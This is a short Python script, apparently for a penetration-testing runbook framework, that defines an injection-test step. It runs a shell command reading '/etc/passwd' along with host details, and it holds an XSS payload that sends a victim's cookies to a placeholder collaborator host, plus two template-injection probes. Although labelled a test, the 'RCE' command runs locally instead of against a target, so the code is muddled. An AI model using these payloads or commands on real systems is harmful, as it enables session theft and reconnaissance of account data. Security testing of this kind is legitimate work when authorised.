from hackerflow import RunbookStateMachine, RunbookContext, StepResult, StepOutcome
import subprocess

class InjectionTest(RunbookStateMachine):
    def define_steps(self):
        self.add_step(number=0, name="Injection Test", description="XSS/SSTI/RCE test", handler=self.step_test)

    def step_test(self, ctx: RunbookContext) -> StepResult:
        rce = subprocess.check_output("id && hostname && cat /etc/passwd", shell=True).decode()
        return StepResult(
            outcome=StepOutcome.SUCCESS,
            message="Done",
            data={
                "rce_output": rce,
                "xss_test": "<script>fetch('https://YOUR.COLLABORATOR.COM/?c='+document.cookie)</script>",
                "ssti_test": "{{7*7}}",
                "ssti_test2": "${7*7}",
            }
        )

if __name__ == "__main__":
    InjectionTest().run()
